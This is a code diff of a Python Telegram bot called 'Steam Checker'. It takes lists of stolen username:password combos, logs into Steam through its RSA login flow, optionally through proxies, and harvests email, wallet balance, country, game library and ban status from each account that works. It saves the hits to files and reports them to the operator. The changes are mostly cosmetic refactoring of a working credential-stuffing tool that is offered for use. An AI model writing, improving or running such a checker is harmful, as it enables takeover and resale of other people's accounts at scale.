@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-STEAM CHECKER TELEGRAM BOT - Supports Text + File
+STEAM CHECKER TELEGRAM BOT - Supports Text Messages + Files
 """
 
 import os
@@ -26,12 +26,12 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
-# Config
+# ========================= CONFIG =========================
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "0").strip())
 
 if not TELEGRAM_TOKEN or OWNER_ID == 0:
-    raise ValueError("Set TELEGRAM_TOKEN and numeric OWNER_ID!")
+    raise ValueError("Set TELEGRAM_TOKEN and numeric OWNER_ID in Railway Variables!")
 
 MY_SIGNATURE = "@pyabrodie"
 TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"
@@ -40,6 +40,7 @@ stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
 lock = threading.Lock()
 
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # ====================== HELPERS ======================
 def create_results_folder():
@@ -54,12 +55,13 @@ def save_hit(filename, data):
         f.write(f"{data}\n")
 
 def shorten_games(games, limit=12):
-    if not games: return "None"
+    if not games:
+        return "None"
     if len(games) > limit:
         return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
     return " | ".join(games)
 
-# ====================== CHECKER (from your original) ======================
+# ====================== CHECKER (Original Logic) ======================
 def check_steam_account(combo, proxy_url=None):
     try:
         username, password = combo.strip().split(':', 1)
@@ -82,6 +84,7 @@ def check_steam_account(combo, proxy_url=None):
     session.headers.update(headers)
 
     try:
+        # RSA Key
         now = str(int(time.time()))
         r1 = session.post("https://steamcommunity.com/login/getrsakey/", 
                          data=f"donotcache={now}&username={user_clean}", timeout=12)
@@ -89,6 +92,7 @@ def check_steam_account(combo, proxy_url=None):
         if not j1.get("success"):
             return None
 
+        # Encrypt password
         n = int(j1["publickey_mod"], 16)
         e = int(j1["publickey_exp"], 16)
         rsa_key = RSA.construct((n, e))
@@ -96,6 +100,7 @@ def check_steam_account(combo, proxy_url=None):
         encrypted = cipher.encrypt(password.encode("utf-8"))
         pass3 = quote_plus(base64.b64encode(encrypted).decode())
 
+        # Login
         now2 = str(int(time.time()))
         payload = f"donotcache={now2}&password={pass3}&username={user_clean}&twofactorcode=&rsatimestamp={j1['timestamp']}&remember_login=false"
 
@@ -106,41 +111,41 @@ def check_steam_account(combo, proxy_url=None):
 
         # Cookies
         for cookie in r2.cookies:
-            for d in [".steamcommunity.com", ".steampowered.com"]:
-                session.cookies.set(cookie.name, cookie.value, domain=d)
+            for domain in [".steamcommunity.com", ".steampowered.com"]:
+                session.cookies.set(cookie.name, cookie.value, domain=domain)
 
         # Fetch details
-        time.sleep(0.5)
+        time.sleep(0.6)
         r_acc = session.get("https://store.steampowered.com/account/", timeout=15)
         email, balance, country = parse_account_page(r_acc.text)
 
-        time.sleep(0.5)
+        time.sleep(0.6)
         r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15)
         total_games, level, limited = parse_profile_page(r_profile.text)
 
-        games = []
-        if int(total_games or 0) > 0:
-            time.sleep(0.5)
-            r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
-            games = parse_games_page(r_games.text)
+        games = parse_games_page(r_profile.text)
 
-        vac = gban = cban = "Unknown"
-        if "/profiles/" in r_profile.url:
-            sid = r_profile.url.split("/profiles/")[1].strip("/")
-            time.sleep(0.5)
-            r_ban = session.get(f"https://steamcommunity.com/profiles/{sid}", timeout=15)
-            vac, gban, cban = parse_ban_page(r_ban.text)
+        vac, gban, cban = parse_ban_page(r_profile.text)
 
         return {
-            "username": username, "password": password, "email": email,
-            "balance": balance, "country": country, "total_games": total_games,
-            "games": games, "level": level, "limited": limited,
-            "vac_bans": vac, "game_bans": gban, "community_ban": cban
+            "username": username,
+            "password": password,
+            "email": email,
+            "balance": balance,
+            "country": country,
+            "total_games": total_games,
+            "games": games,
+            "level": level,
+            "limited": limited,
+            "vac_bans": vac,
+            "game_bans": gban,
+            "community_ban": cban,
         }
-    except:
+    except Exception as e:
+        logger.debug(f"Failed {username}: {e}")
         return None
 
-# Parsers (from original)
+# Parsers
 def parse_account_page(html):
     email = balance = country = "Unknown"
     try:
@@ -156,17 +161,17 @@ def parse_account_page(html):
     return email, balance, country
 
 def parse_profile_page(html):
-    total = level = "0"
+    total_games = level = "0"
     limited = "No"
     try:
         soup = BeautifulSoup(html, "html.parser")
         if a := soup.find("a", href=re.compile(r"/games/")):
             if m := re.search(r'(\d+)', a.get_text() or ""):
-                total = m.group(1)
+                total_games = m.group(1)
         if "limited account" in html.lower():
             limited = "Yes"
     except: pass
-    return total, level, limited
+    return total_games, level, limited
 
 def parse_games_page(html):
     games = []
@@ -196,6 +201,7 @@ def process_account(combo, proxies, chat_id, bot):
     if result:
         hit_line = f"{result['username']}:{result['password']}"
         save_hit("All_Hits.txt", hit_line)
+
         if result['email'] != "Unknown":
             save_hit("Valid_With_Email.txt", f"{hit_line}\n{result['email']}:{result['password']}")
         else:
@@ -255,6 +261,8 @@ async def run_checker(combos, proxies, chat_id, bot):
 ❌ Invalid: {stats['invalid']}
 📊 Total: {stats['total']}
 
+Results files sent.
+
 💎 {MY_SIGNATURE}"""
 
     await bot.send_message(chat_id, summary, parse_mode=ParseMode.HTML)
@@ -269,9 +277,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
     await update.message.reply_text(
         "🤖 <b>Steam Checker Bot Ready</b>\n\n"
-        "You can:\n"
-        "• Send combo as text message (one per line)\n"
-        "• Upload .txt file\n"
+        "• Paste combos directly (one per line)\n"
+        "• Or upload .txt file\n"
         "• Send proxies.txt\n"
         "/status", parse_mode=ParseMode.HTML)
 
@@ -286,17 +293,17 @@ async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📊 Checked: {stats['checked']}/{stats['total']}\nValid: {stats['valid']}", 
             parse_mode=ParseMode.HTML)
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
     text = update.message.text.strip()
     if not text or ':' not in text:
         return
 
-    combos = [line.strip() for line in text.split('\n') if ':' in line.strip()]
+    combos = [line.strip() for line in text.splitlines() if ':' in line.strip()]
     if not combos:
         return
 
-    await update.message.reply_text(f"✅ Received {len(combos)} combos from text. Starting check...")
+    await update.message.reply_text(f"✅ Received {len(combos)} combos. Starting check...")
 
     proxies = context.user_data.get('proxies', [])
     asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))
@@ -308,7 +315,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Only .txt files!")
         return
 
-    await update.message.reply_text(f"📥 Received file: {doc.file_name}")
+    await update.message.reply_text(f"📥 Received: {doc.file_name}")
     file = await doc.get_file()
     path = f"/tmp/{doc.file_name}"
     await file.download_to_drive(path)
@@ -335,10 +342,10 @@ def main():
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("status", status_cmd))
-    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_text))
     app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
 
-    print("🚀 Steam Checker Bot Started - Supports Text + File")
+    print("🚀 Steam Checker Bot Started - Text + File Support")
     app.run_polling()
 
 if __name__ == "__main__":
